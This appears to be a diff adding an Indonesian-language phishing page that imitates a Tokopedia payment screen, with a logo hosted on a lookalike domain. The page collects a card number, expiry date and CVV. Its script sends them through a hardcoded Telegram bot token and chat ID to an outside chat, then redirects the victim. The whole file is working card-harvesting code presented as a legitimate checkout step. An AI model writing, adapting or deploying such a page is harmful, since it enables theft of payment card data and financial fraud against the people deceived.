@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Metode Kartu</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      background: #fff;
+      color: #000;
+    }
+    .header {
+      background-color: #03AC0E;
+      padding: 14px;
+      text-align: center;
+    }
+    .header img {
+      height: 30px;
+    }
+    .container {
+      padding: 20px;
+    }
+    .title {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .input-group {
+      margin-bottom: 15px;
+    }
+    .input-group label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 5px;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+    }
+    .input-half {
+      display: flex;
+      gap: 10px;
+    }
+    .btn-submit {
+      background-color: #03AC0E;
+      color: #fff;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      width: 100%;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .btn-submit:disabled {
+      background-color: #ccc;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <img src="https://tokopdiacare.com/gallery/1000135361-3.png?ts=1749869290" alt="Logo"/>
+  </div>
+
+  <div class="container">
+    <div class="title">Gunakan Kartu Debit/Kredit</div>
+
+    <div class="input-group">
+      <label>Nomor Kartu</label>
+      <input type="text" id="card-number" placeholder="Contoh: 4556 7383 9002 1234" inputmode="numeric" maxlength="19">
+    </div>
+
+    <div class="input-half">
+      <div class="input-group" style="flex:1">
+        <label>Masa Berlaku (MM/YY)</label>
+        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric">
+      </div>
+      <div class="input-group" style="flex:1">
+        <label>CVV</label>
+        <input type="text" id="cvv" placeholder="CVV" maxlength="3" inputmode="numeric">
+      </div>
+    </div>
+
+    <button class="btn-submit" id="submitBtn">Lanjutkan</button>
+  </div>
+
+  <script>
+    const cardNumber = document.getElementById('card-number');
+    const expiryInput = document.getElementById('expiry');
+    const cvvInput = document.getElementById('cvv');
+    const submitBtn = document.getElementById('submitBtn');
+
+    // Format nomor kartu otomatis
+    cardNumber.addEventListener('input', function (e) {
+      let value = e.target.value.replace(/\D/g, '').substring(0, 16);
+      let formatted = '';
+      for (let i = 0; i < value.length; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += value[i];
+      }
+      e.target.value = formatted;
+    });
+
+    // Format masa berlaku otomatis MM/YY
+    expiryInput.addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 2) value = value.slice(0, 2) + '/' + value.slice(2, 4);
+      e.target.value = value;
+    });
+
+    // CVV hanya 3 angka
+    cvvInput.addEventListener('input', function(e) {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
+    });
+
+    // Kirim ke Telegram saat diklik dan redirect
+    submitBtn.addEventListener('click', async function () {
+      const card = cardNumber.value.trim();
+      const expiry = expiryInput.value.trim();
+      const cvv = cvvInput.value.trim();
+
+      if (!card || !expiry || !cvv) {
+        alert('Silakan isi semua data');
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Mengirim...';
+
+      const token = '7223686317:AAFJKbUn4qC-s9s6Ii-vQRevQ47bk47TS2I';
+      const chatId = '7386992179';
+      const message = `💳 Data Kartu\n\nNomor: ${card}\nMasa Berlaku: ${expiry}\nCVV: ${cvv}`;
+
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+
+      // Redirect setelah 1 detik
+      setTimeout(() => {
+        window.location.href = "tp.html";
+      }, 1000);
+    });
+  </script>
+
+</body>
+</html>
